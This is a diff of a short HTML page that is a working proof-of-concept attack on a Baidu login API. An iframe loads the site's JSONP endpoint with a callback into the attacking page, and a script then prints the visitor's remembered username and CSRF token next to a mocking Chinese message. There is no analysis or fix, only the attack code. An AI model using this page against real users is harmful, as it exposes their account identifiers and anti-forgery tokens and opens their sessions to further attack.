@@ -1,21 +1,11 @@
 <html>
-
 <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
-
 <body>
-
 <script>
-
 function test(obj){
-
         document.write(obj.data.rememberedUserName+"你好，您的CSRF节操已掉。节操编号为"+obj.data.token);
-
         document.end();
-
 }
-
 </script>
-
 <iframe src='javascript:"<script src=\"https://passport.baidu.com/v2/api/?getapi&tpl=gxt&apiver=v3&class=login&logintype=dialogLogin&callback=parent.test\"></script>"'></iframe>
-
 </body></html>
